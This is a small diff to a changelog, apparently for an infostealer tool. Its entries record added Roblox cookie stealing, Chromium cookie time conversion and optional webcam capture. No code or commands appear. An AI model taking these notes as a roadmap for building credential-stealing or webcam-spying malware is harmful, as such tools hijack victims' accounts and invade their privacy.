@@ -92,3 +92,7 @@ changelog 2026-06-13:
 changelog 2026-06-16:
 - added roblox cookie stealing
 - added unix time conversion for chromium cookies (its about time i did that)
+  
+changelog 2026-06-20:
+_ made the file size smaller if cv2 isn't used (capture webcam is off)
+
